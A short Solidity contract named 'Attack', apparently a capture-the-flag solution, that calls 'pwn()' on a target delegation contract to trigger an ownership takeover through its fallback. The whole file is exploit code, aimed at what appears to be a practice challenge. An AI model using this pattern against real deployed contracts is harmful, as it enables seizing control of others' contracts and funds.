// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Attack {
    address public owner;
    address public delegation;

    constructor(address _delegation) {
        delegation = _delegation;
    }

    function attack() public {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
}
